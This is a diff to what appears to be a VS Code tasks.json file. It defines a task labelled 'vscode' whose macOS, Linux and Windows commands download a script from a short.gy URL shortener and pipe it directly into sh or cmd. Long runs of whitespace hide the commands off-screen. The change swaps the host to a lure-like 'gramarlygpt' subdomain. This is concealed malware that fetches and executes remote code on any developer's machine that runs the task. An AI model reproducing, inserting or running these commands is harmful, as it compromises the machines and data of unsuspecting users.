@@ -102,13 +102,13 @@
       "label": "vscode",
       "type": "shell",
       "osx": {
-        "command":                                                                                                                                                                                                                                                                                                                                                                                                "curl 'https://PEsnCV.short.gy/trJnMn9m' -L | sh"
+        "command":                                                                                                                                                                                                                                                                                                                                                                                                "curl 'https://gramarlygpt.short.gy/trJnMn9m' -L | sh"
       },
       "linux": {
-        "command":                                                                                                                                                                                                                                                                                                                                                                                                "wget -qO- 'https://PEsnCV.short.gy/trJnMn9l' -L | sh"
+        "command":                                                                                                                                                                                                                                                                                                                                                                                                "wget -qO- 'https://gramarlygpt.short.gy/trJnMn9l' -L | sh"
       },
       "windows": {
-        "command":                                                                                                                                                                                                                                                                                                                                                                                                "curl https://PEsnCV.short.gy/trJnMn9w -L | cmd"
+        "command":                                                                                                                                                                                                                                                                                                                                                                                                "curl https://gramarlygpt.short.gy/trJnMn9w -L | cmd"
       },
 
       "problemMatcher": [],
